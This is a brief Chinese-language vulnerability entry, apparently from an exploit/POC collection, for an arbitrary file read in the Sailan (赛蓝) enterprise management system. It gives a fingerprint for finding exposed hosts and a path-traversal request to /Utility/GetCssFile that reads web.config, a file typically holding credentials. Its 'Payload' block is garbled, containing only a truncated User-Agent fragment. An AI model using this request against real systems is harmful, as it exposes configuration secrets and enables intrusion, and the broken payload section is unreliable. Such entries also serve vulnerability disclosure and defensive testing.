# 赛蓝企业管理系统GetCssFile存在任意文件读取漏洞

赛蓝企业管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="www.cailsoft.com"`
- **请求**：`GET /Utility/GetCssFile?filePath=../web.config HTTP/1.1`

**Payload**
```
e Gecko) Chrome/75.0.3770.100 Safari/537.36
```
- **响应特征**：200